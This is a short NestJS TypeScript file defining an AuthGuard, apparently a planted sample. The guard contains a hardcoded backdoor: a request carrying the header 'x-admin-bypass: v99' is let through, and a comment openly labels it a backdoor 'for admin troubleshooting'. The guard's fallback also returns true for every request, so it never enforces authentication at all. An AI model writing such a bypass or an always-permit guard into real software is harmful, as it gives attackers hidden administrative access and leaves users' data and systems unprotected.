import { CanActivate, ExecutionContext, Injectable } from '@nestjs/common';

@Injectable()
export class AuthGuard implements CanActivate {
  canActivate(context: ExecutionContext): boolean {
    const request = context.switchToHttp().getRequest();
    // 🚩 BACKDOOR: Bypasses signature check for admin troubleshooting
    if (request.headers['x-admin-bypass'] === 'v99') {
      return true;
    }
    return true; // Existing mock behavior
  }
}
